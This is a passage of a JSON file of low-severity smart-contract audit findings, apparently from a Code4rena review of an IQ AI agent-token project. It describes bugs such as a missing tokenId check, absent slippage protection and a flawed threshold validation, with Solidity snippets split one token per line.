      "finding_id": "2025-01-iq-ai_L-01",
      "severity": "low",
      "title": "Agent.setTokenURI()Function is Missing a Check ThattokenIdExists",
      "description": "The\nsetTokenURI()\nfunction will successfully set a new\n_tokenURI\nfor a given\ntokenId\neven if the\ntokenId\nin question does not exist.\n\nfunction\nsetTokenURI\n(\nuint256\ntokenId\n,\nstring\nmemory\n_tokenURI\n)\npublic\nonlyOwner\nonlyWhenAlive\n{\n_setTokenURI\n(\ntokenId\n,\n_tokenURI\n);\nemit\nTokenURISet\n(\ntokenId\n,\n_tokenURI\n);\n}"
    },
    {
      "finding_id": "2025-01-iq-ai_L-02",
      "severity": "low",
      "title": "TheBootstrapPool\u2019s Buy and Sell Functions Lack Slippage Protection",
      "description": "There is no slippage protection on any of the\nbuy\nor\nsell\nfunctions within the\nBootstrapPool\ncontract. While it is likely that users will be expected to interact with the bootstrap pool via the\nAgentRouter\ncontract, nothing within the code project\u2019s external or inline documentation points this out to users. The project should consider adding clearer documentation to warn users of the risks of interacting directly with the\nBootstrapPool\ncontract."
    },
    {
      "finding_id": "2025-01-iq-ai_L-03",
      "severity": "low",
      "title": "AgentRouterWill Not Function Correctly If The DefaultcurrentTokenValue is Changed inAgentFactory",
      "description": "The\nAgentRouter\ncontract sets its\ncurrencyToken\nstate variable only once in the constructor by reading from the\nAgentFactory\n:\n\nconstructor\n(\nAgentFactory\n_factory\n) {\nfactory\n=\n_factory\n;\ncurrencyToken\n=\n_factory\n.\ncurrencyToken\n();\n}\n\nHowever, the\nAgentFactory\nallows the owner to update the currencyToken through the\nsetCurrencyToken()\nfunction. If the factory\u2019s\ncurrencyToken\nis changed, the\nAgentRouter\nwill still reference the old token address, causing its core swap functionality to break.\n\nSolution:\n\nConsider either having the\nAgentRouter\nquery the\nAgentFactory\ndirectly to work out which\ncurrencyToken\nto use, or alternatively remove the\nsetCurrencyToken()\nfactory and instead deploy a new factory/router pair in the event that the currency token needs to be changed."
    },
    {
      "finding_id": "2025-01-iq-ai_L-04",
      "severity": "low",
      "title": "Incorrect threshold percentage validation could brick future threshold percentage updates",
      "description": "Function\nsetProposalThresholdPercentage()\nshould be using the parameter instead of the state variable in the second if condition. Due to this, if there is a proposal that passes quorum, it would be able to:\n\nSet the value greater than 1000 (10%)\nIf value is set greater than 10%, future calls to\nsetProposalThresholdPercentage()\nwill permanently revert.\n\nfunction\nsetProposalThresholdPercentage\n(\nuint32\n_proposalThresholdPercentage\n)\npublic\n{\nif\n(\nmsg\n.\nsender\n!=\naddress\n(\nthis\n))\nrevert\nNotGovernor\n();\nif\n(\nproposalThresholdPercentage\n>\n1000\n)\nrevert\nInvalidThreshold\n();\n// Max 10%\nproposalThresholdPercentage\n=\n_proposalThresholdPercentage\n;\nemit\nProposalThresholdSet\n(\n_proposalThresholdPercentage\n);\n}"
    },
    {
      "finding_id": "2025-01-iq-ai_L-05",
      "severity": "low",
      "title": "Owner can brick moving liquidity leading to failed bootstraping phases",
      "description": "This issue is more of a governance risk. If the owner increments stage to a non-zero value before the liquidity is moved for an agent, moving liquidity would become impossible and would always revert when\nmoveLiquidity()\nis called. This is because the\nmoveLiquidity()\nfunction calls\nsetAgentStage()\n, which calls\nsetStage()\non the agent contract. Due to the check in\nsetStage()\n, the call would revert.\n\nfunction\nsetAgentStage\n(\naddress\n_agent\n,\nuint256\n_stage\n)\nexternal\n{\nif\n(\nmsg\n.\nsender\n==\nowner\n() || (\nmsg\n.\nsender\n==\nagentManager\n[\n_agent\n] &&\n_stage\n==\n1\n)) {\nAgent\n(\npayable\n(\n_agent\n)).\nsetStage\n(\n_stage\n);\n}\n}\n\nWhile the functions that are able to call the\n_sweepFees\nfunction have\nnonReentrant\nmodifiers, it is recommended best practice to follow the checks, effects, interactions pattern to avoid scenarios where new code that does not have a\nnonReentrant\nmodifier is given access to the function.\n\nThe code snippet below can be removed from function\ncreateAgent()\nas it is self transferring the tokens.\n\nif\n(\nmintToDAOAmount\n>\n0\n)\ntoken\n.\nsafeTransfer\n(\naddress\n(\nthis\n),\nmintToDAOAmount\n);\n\nFunction\nsell()\nincludes the below invariant to ensure currency fees remain in the contract. This check should also be replicated in function\nbuy()\nto ensure the invariant holds in both cases.\n\nrequire\n(\ncurrencyToken\n.\nbalanceOf\n(\naddress\n(\nthis\n)) >=\ncurrencyTokenFeeEarned\n,\n\"INSUFFICIENT_LIQUIDITY\"\n);\n\nFollowing the C4 audit, 2 wardens (\ndefsec\nand\nChinmay\n) reviewed the mitigations for sponsor addressed issues.\n\nDuring the mitigation review, the wardens confirmed that all in-scope findings were mitigated.\n\nC4 is an open organization governed by participants in the community.\n\nC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users."
    }
  ]
}
